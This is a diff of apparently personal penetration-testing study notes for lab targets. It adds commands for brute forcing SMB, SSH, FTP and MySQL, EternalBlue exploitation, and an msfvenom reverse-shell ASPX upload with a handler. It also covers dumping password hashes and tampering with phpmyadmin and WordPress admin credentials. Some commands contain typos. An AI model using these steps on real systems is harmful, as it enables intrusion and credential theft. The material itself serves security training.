@@ -75,18 +75,28 @@ _with metasploit_
    - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`,
    - `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt`,
    - `set VERBOSE false` < - for only succeced attempts
-5. use psexec.py to login with found credentials: `psecexec.py Administrator@10.10.x.x cmd.exe`, fill in the passwords
+5. use psexec.py to login with found credentials, if not executable use: `chmod +X` first: `psexec.py Administrator@10.10.x.x cmd.exe`, fill in the passwords
+6. !! look at exploiting SMB for more stuff on psexec
 
 _use psexec with metasploit_
 
 1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options
+   
+### Exploiting SMB 
+1. brute force: `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_paswords.txt 10.10.x.x smb`
+2. when found creds: `smbclient -L 10.10.x.x -U username`
+3. OR/AND: `smbmap -u username -p password -H 10.10.x.x`
+4. OR use enum4linux: `enum4linux -u username -p password -U 10.10.x.x`
+5.  in msfconsole: `search smb_enumusers` -> `use auxiliary/scanner/smb/smb_enumusers` -> `set RHOSTS` -> `set SMBUser` -> `set SMBPass` -> `run`
+6.  PsExex: `locate psexec.py` -> `cp /usr/share/doc/python3-impacket/examples/psexec.py .` -> `chmod +X` -> `python3 psexec.py Administrator@10.10.x.x`
 
 ### Eternal Blue
 - you can first check if target is vulnerable by: `msfconsole` -> `search eternalblue` --> use the auxilary scanner: `auxiliary/scanner/smb/smb_ms17_010` 
 1. nmap script to check if internal blue `sudo nmap -sV -p 445 --script=smb-vuln-ms17.010 10.10.x.x`
 2. msfconsole: `search eternalblue`
 3. `use exploit/windows/smb/ms17:010_eternalblue`
-4. set options
+4. set options -> run
+5. `sysinfo`, `getuid`
 
 ### Exploiting RDP
 
@@ -304,12 +314,17 @@ DO MIMIKATZ FIRST!
 2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* ` -> run nmap script: `nmap -sV 10.10.x.x --script=ftp-anon`
 3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
 4. login: `ftp 10.10.x.x` --> fill in username and password --> to download / show file `get secret.txt`
-
-### Exploiting SSH
+5.  if supports .asp, try to get a reverse shell with and asp file
+6.  create reverse shell: `msfvenom -p windows/shell/reverse_tcp LHOST=... LPORT=1234 -f asp > shell.aspx`
+7.  log in to FTP server while in the same working directory as where the reverse shell is stored, then -> in FTP `put shell.aspx`
+8.  start msfconsole, then: `use multi/handler` -> `set payload windows/shell/reverse_tcp` -> set LHOST -> set LPORT -> run
+9.  go to browser and navigate to shell: `10.10.x.x/shell.aspx` , if it does not work try another exploit. 
+### Exploiting OpenSSH
 - TCP port 22
 1. Brute force attack: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 10.10.x.x -t 4 ssh`
 2. login: `ssh sysadmin@10.10.x.x`
-
+3. open msfconsole -> `search ssh_login` -> `use 0` -> `set RHOSTS` -> `set USERNAME vagrant` -> `set PASSWORD vagran`t -> `sessions` to see ->use session `sessions 1` -> `background` OR `CTRL+z`. or just stop at `sessions 1`
+   
 ### Exploiting SAMBA
 - port 445, maybe 139
 - brute force, SMBmap to enumerate, SMBclient also
@@ -350,3 +365,16 @@ R=READ - W=WRITE - S=SUID - X=EXECUTE -
 -  !!Gain privilege first and root user!!
 1. if root user: `cat /etc/shadow`
 2. background meterpreter session and `search hashdump`
+
+### Exploiting MySQL Database
+port: 3306
+1. `searchsploit MySQL version.version`
+2. BruteForce MSFconsol: `search mysql_login` -> `use 0` -> `set RHOSTS ->set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt` -> `run`
+3.  mysql login, in terminal: `mysql -u root -p -h 10.10.x.x`, password is null, hit enter
+4.  in MySQL: `show databases` -, 
+5.  Modify phpmyadmin on wordpress page to allow access from browser: msfconsole: `search eternalblue` -> `use 0` -> `set RHOSTS` ->` set LPORT and LHOSTS` -> `run` -> `C:\` , look for wamp, `cd wamp\\` -> `cd www\\` <- under this you might find worpress config file to get mysql root password -> find "alias" directory and look for phpmyadmin.conf -> `download phpmyadmin.conf` -> modify file with vim -> in `<Directory> delete all rules under "AllowOverride all" and write "Allow from all"` see picture ![alt text](/assets/phpmyadmin_change.png), then save
+6.  in msfconsol: `upload phpmyadmin.conf` , restart service in session. `net stop wampapache` -> `net start wampapache` 
+7.  go to website 10.10.x.x:8585/phpmyadmin/
+8.  go to wp_users and change password of admin -> column: user_pass, function:MD5 , value: your password
+9.  go to wordpresspage: 10.10.x.x:8585/wordpress/wp-admin and log in
+10. 
